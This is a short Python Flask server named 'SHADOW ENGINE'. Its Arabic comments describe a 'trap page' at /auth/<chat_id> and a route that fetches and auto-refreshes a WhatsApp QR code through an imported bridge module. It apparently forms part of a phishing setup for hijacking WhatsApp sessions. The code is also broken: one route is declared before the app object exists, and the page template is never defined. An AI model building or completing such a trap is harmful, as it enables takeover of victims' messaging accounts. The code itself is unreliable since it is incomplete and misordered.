@app.route('/')
def home():
    return "<h1>SHADOW ENGINE IS LIVE 🚀</h1><p>System is monitoring...</p>", 200
from flask import Flask, render_template_string, jsonify, request
import os
from bridge import WhatsAppBridge # الربط مع ملفك الخاص

app = Flask(__name__)
# تحميل إعدادات env التي ذكرتها
PORT = int(os.environ.get("PORT", 10000))

@app.route('/auth/<chat_id>')
def auth_page(chat_id):
    # صفحة المصيدة التي تحدثنا عنها سابقاً
    return render_template_string(HTML_TEMPLATE, chat_id=chat_id)

@app.route('/api/bridge/qr/<chat_id>')
def get_bridge_qr(chat_id):
    # خوارزمية سحب الـ QR وتحديثه تلقائياً
    qr_data = WhatsAppBridge.generate_qr(chat_id)
    return jsonify({"url": qr_data})
    
if __name__ == "__main__":
    # رندر يحتاج لقراءة المنفذ من البيئة المحيطة
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
